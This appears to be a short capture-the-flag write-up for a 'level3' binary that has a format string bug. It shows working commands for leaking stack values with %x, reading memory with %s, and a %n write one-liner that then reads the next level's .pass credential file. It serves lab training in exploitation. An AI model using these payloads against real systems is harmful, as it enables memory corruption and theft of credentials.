### Key Insights
- No bounds on format string processing
- Can read arbitrary stack/memory
- Can write arbitrary values via %n
- No ASLR or canaries in this binary
- Completely preventable with printf("%s\n", buffer)

### Exploitation
**Leak stack values:**
```bash
./level3 <<< "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x."
```
Output: 200.f5fc95c0.80491a5.4b52414d.78255245...
Each %x reads next stack value.
**Read from memory:**
```bash
./level3 <<< "AAAA%s"  # Read string from 0x41414141
```
**Write to memory (requires target address on stack):**
(python -c "import struct,sys;sys.stdout.write(struct.pack('<I',0x804988c)+'C'*60+'%4\$n\n')"; echo 'cat /home/user/level4/.pass'; cat) | /home/user/level3/level3
